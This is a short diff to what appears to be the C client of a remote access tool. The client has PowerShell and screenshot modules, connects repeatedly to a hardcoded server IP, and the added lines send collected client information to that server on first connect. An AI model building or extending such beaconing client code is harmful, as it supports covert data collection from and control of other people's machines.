@@ -7,6 +7,7 @@
 #include "client/client_psh.h"
 #include "client/screenshot.h"
 #include "common.h"
+#include "client/info.h"
 
 #define SERVER_IP "192.168.100.100"
 
@@ -26,6 +27,11 @@ int main() {
     while (connect(sock, (struct sockaddr*)&serv, sizeof(serv)) < 0) {
         sleep(3);
     }
+
+    // Send client info upon first time connecting
+    char* client_info = print_client_info();
+    safe_send_payload(sock, client_info, strlen(client_info) + 1, 0);
+    free(client_info);
 
     // Main loop
     while (1) {
